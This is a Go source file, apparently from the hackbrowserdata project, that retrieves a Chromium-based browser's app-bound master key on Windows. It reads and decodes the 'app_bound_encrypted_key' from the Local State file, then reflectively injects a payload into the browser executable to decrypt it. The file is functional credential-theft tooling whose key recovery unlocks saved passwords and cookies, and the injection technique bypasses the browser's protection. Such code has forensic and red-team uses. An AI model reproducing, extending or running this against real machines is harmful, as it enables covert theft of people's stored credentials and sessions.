//go:build windows

package keyretriever

import (
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"strings"

	"github.com/tidwall/gjson"

	"github.com/moond4rk/hackbrowserdata/crypto"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/utils/browserutil"
	"github.com/moond4rk/hackbrowserdata/utils/injector"
)

const envEncKeyB64 = "HBD_ABE_ENC_B64"

var appbPrefix = []byte{'A', 'P', 'P', 'B'}

var errNoABEKey = errors.New("abe: Local State has no app_bound_encrypted_key")

type ABERetriever struct{}

func (r *ABERetriever) RetrieveKey(storage, localStatePath string) ([]byte, error) {
	browserKey := strings.TrimSpace(storage)
	if browserKey == "" {
		return nil, fmt.Errorf("abe: empty browser key in storage parameter")
	}

	encKey, err := loadEncryptedKey(localStatePath)
	if err != nil {
		return nil, err
	}

	if cliKey := crypto.GetABEMasterKey(); len(cliKey) > 0 {
		log.Debugf("abe: using --abe-key for %s", browserKey)
		return cliKey, nil
	}

	payload, err := crypto.ABEPayload("amd64")
	if err != nil {
		return nil, fmt.Errorf("abe: %w", err)
	}

	exePath, err := browserutil.ExecutablePath(browserKey)
	if err != nil {
		return nil, fmt.Errorf("abe: %w", err)
	}

	env := map[string]string{
		envEncKeyB64: base64.StdEncoding.EncodeToString(encKey),
	}

	inj := &injector.Reflective{}
	key, err := inj.Inject(exePath, payload, env)
	if err != nil {
		return nil, fmt.Errorf("abe: inject into %s: %w", exePath, err)
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("abe: unexpected key length %d (want 32)", len(key))
	}
	log.Debugf("abe: retrieved %s master key via reflective injection", browserKey)
	return key, nil
}

func loadEncryptedKey(localStatePath string) ([]byte, error) {
	if localStatePath == "" {
		return nil, errNoABEKey
	}
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("abe: read Local State: %w", err)
	}

	raw := gjson.GetBytes(data, "os_crypt.app_bound_encrypted_key")
	if !raw.Exists() {
		return nil, errNoABEKey
	}

	decoded, err := base64.StdEncoding.DecodeString(raw.String())
	if err != nil {
		return nil, fmt.Errorf("abe: base64 decode: %w", err)
	}
	if len(decoded) <= len(appbPrefix) {
		return nil, fmt.Errorf("abe: encrypted key too short: %d bytes", len(decoded))
	}
	for i, b := range appbPrefix {
		if decoded[i] != b {
			return nil, fmt.Errorf("abe: unexpected prefix: got %q, want %q",
				decoded[:len(appbPrefix)], appbPrefix)
		}
	}
	return decoded[len(appbPrefix):], nil
}
